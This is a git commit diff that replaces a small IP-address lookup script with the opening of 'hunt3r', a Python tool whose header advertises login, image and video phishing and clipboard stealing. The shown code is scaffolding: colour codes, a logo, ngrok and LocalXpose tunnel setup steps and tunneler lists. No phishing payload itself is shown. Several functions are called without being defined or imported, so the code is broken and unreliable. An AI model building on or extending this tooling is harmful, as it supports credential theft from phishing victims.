5df8a8e45eecd1b694ad34da9c0e22ba847ae490
Amzad hossain <portable36@gmail.com>
2022-10-15 21:21:27 +0600

    Update hunt3r.py

--- hunt3r.py
+++ hunt3r.py
@@ -1,8 +1,17 @@
-# hunt3r
-
-# Author - Amzad Hossain
-
-# github - https://github.com/portable36
+# -*- coding: UTF-8 -*-
+# ToolName   : hunt3r
+# Author     : Spyder
+# Version    : 1.0
+# License    : GPL V3
+# Copyright  : Spyder (2021-2022)
+# Github     : https://github.com/portable36
+# Description: hunt3r
+# Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
+# 1st Commit : 12/10/2022
+# Language   : Python
+# Portable file/script
+# If you copy open source code, consider giving credit
+# Env        : #!/usr/bin/env python
 
 
 
@@ -10,123 +19,99 @@ import json
 import urllib.request
 import webbrowser
 import os
+import os, sys, time
+
+# Color snippets
+black="\033[0;30m"
+red="\033[0;31m"
+bred="\033[1;31m"
+green="\033[0;32m"
+bgreen="\033[1;32m"
+yellow="\033[0;33m"
+byellow="\033[1;33m"
+blue="\033[0;34m"
+bblue="\033[1;34m"
+purple="\033[0;35m"
+bpurple="\033[1;35m"
+cyan="\033[0;36m"
+bcyan="\033[1;36m"
+white="\033[0;37m"
+nc="\033[00m"
+# Bold
+bblack="\033[1;30m"
+bred="\033[1;31m"
+bgreen="\033[1;32m"
+byellow="\033[1;33m"
+bblue="\033[1;34m"
+bpurple="\033[1;35m"
+bcyan="\033[1;36m"
+bwhite="\033[1;37m"
+
+version="1.0"
+
+# Regular Snippets
+ask  =     f"{green}[{white}?{green}] {yellow}"
+success = f"{yellow}[{white}√{yellow}] {green}"
+error  =    f"{blue}[{white}!{blue}] {red}"
+info  =   f"{yellow}[{white}+{yellow}] {cyan}"
+info2  =   f"{green}[{white}•{green}] {purple}"
+
+logo='''
+'''+green+''' _   _             _   _____      
+'''+red+'''| | | |_   _ _ __ | |_|___ / _ __ 
+'''+cyan+'''| |_| | | | | '_ \| __| |_ \| '__|
+'''+yellow+'''|  _  | |_| | | | | |_ ___) | |   
+'''+blue+'''|_| |_|\__,_|_| |_|\__|____/|_|   
+'''+purple+'''  By '''+yellow+'''Amzad Hossain                                
+'''+green+'''
+'''
+def slowprint(n):
+    for word in n + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        time.sleep(0.01)
+slowprint(logo)
+
+nr_help = f"""
+{info}Steps: {nc}
+{blue}[1]{yellow} Go to {green}https://ngrok.com
+{blue}[2]{yellow} Create an account 
+{blue}[3]{yellow} Login to your account
+{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
+"""
+
+lx_help = f"""
+{info}Steps: {nc}
+{blue}[1]{yellow} Go to {green}https://localxpose.io
+{blue}[2]{yellow} Create an account 
+{blue}[3]{yellow} Login to your account
+{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
+"""
+
+packages = [ "php", "ssh" ]
+modules = [ "requests", "bs4" ]
+tunnelers = [ "ngrok", "cloudflared", "loclx" ]
+processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
+extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]
+
+
 try:
-    R='\033[91m'
-    Y='\033[93m'
-    G='\033[92m'
-    CY='\033[96m'
-    W='\033[97m'
-    path=os.path.isfile('/data/data/com.termux/files/usr/bin/bash')
-    def start():
-        os.system('clear')
-        print (CY+"""
- _ ______ _       _                 
-| (_____ (_)     | |                
-| |_____) )  ____| |  _ _____  ____ 
-| |  ____/ |/ ___) |_/ ) ___ |/ ___)
-| | |    | ( (___|  _ (| ____| |    
-|_|_|    |_|\____)_| \_)_____)_|   """+Y+"""v1.1"""+G+"""
+    test = popen("cd $HOME && pwd").read()
+except:
+    exit()
 
-             
-     Simple IP Address locator
+supported_version = 3
 
-"""+R+""">>"""+Y+"""----"""+CY+""" Amzad Hossain """+Y+"""----"""+R+"""<<""")
-        
-    def m3():
-        try:
-            print(R+"""\n
-#"""+Y+""" Select option"""+G+""" >>"""+Y+"""
-
-1)"""+G+""" Check your IP info"""+Y+"""
-2)"""+G+""" Check other IP info"""+Y+"""
-3)"""+G+""" Exit
-""")
-            ch=int(input(CY+"Enter Your choice: "+W))
-            if ch==1:
-                main2()
-                m3()
-            elif ch==2:
-                main()
-                m3()
-            elif ch==3:
-                print(Y+"Exit................"+W)
-            else:
-                print(R+"\nInvalid choice! Please try again\n")
-                m3()
-        except ValueError:
-            print(R+"\nInvalid choice! Please try again\n")
-            m3()
-        
-    def finder(u):
-        try:
-            try:
-                response = urllib.request.urlopen(u)
-                data = json.load(response)
-
-                print(R+"\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-                print(Y+'\n>>>'+CY+' IP address details\n ')
-                print(G+"1) IP Address : "+Y,data['query'],'\n')
-                print(G+"2) Org : "+Y,data['org'],'\n')
-                print(G+"3) City : "+Y,data['city'],'\n')
-                print(G+"4) Region : "+Y,data['regionName'],'\n')
-                print(G+"5) Country : "+Y,data['country'],'\n')
-                print(G+"6) Location\n")
-                print(G+"\tLattitude : "+Y,data['lat'],'\n')
-                print(G+"\tLongitude : "+Y,data['lon'],'\n')
-                l='https://www.google.com/maps/place/'+str(data['lat'])+'+'+str(data['lon'])
-                print(R+"\n#"+Y+" Google Map link : "+CY,l)
-                path=os.path.isfile('/data/data/com.termux/files/usr/bin/bash')
-                if path:
-                    link='am start -a android.intent.action.VIEW -d '+str(l)
-                    pr=input(R+"\n>>"+Y+" Open link in browser?"+G+" (y|n): "+W)
-                    if pr=="y":
-                        lnk=str(link)+" > /dev/null"
-                        os.system(str(lnk))
-                        start()
-                        m3()
-                    elif pr=="n":
-                        print("\nCheck another IP or exit using Ctrl + C\n\n")
-                        start()
-                        m3()
-                    else:
-                        print("\nInvalid choice! Please try again\n")
-                        m3()
-                else:
-                    pr=input(R+"\n>>"+Y+" Open link in browser?"+G+" (y|n): "+W)
-                    if pr=="y":
-                        webbrowser.open(l,new=0)
-                        start()
-                        m3()
-                    elif pr=="n":
-                        print(R+"\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-                        print(Y+"\nCheck another IP or exit using "+R+"Ctrl + C\n\n")
-                        start()
-                        m3()
-                    else:
-                        print(R+"\nInvalid choice! Please try again\n")
-                        m3()
-                return
-            except KeyError:
-                print(R+"\nError! Invalid IP/Website Address!\n"+W)
-                m3()
-        except urllib.error.URLError:
-            print(R+"\nError!"+Y+" Please check your internet connection!\n"+W)
-            exit()
-
-        
-    def main():
-        u=input(G+"\n>>> "+Y+"Enter IP Address/website address:"+W+" ")
-        if u=="":
-            print(R+"\nEnter valid IP Address/website address!")
-            main()
-        else:
-            url ='http://ip-api.com/json/'+u
-            finder(url)
-    def main2():
-        url ='http://ip-api.com/json/'
-        finder(url)
-        
-    start()
-    m3()
-except KeyboardInterrupt:
-    print(Y+"\nInterrupted ! Have a nice day :)"+W)
+if version_info[0] != supported_version:
+    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
+    exit(0)
+    
+    # Clear the screen and show logo
+def clear(fast=False, lol=False):
+    shell("clear")
+    if fast:
+        print(logo)
+    elif lol:
+        lolcat(logo)
+    else:
+        sprint(logo, 0.01)
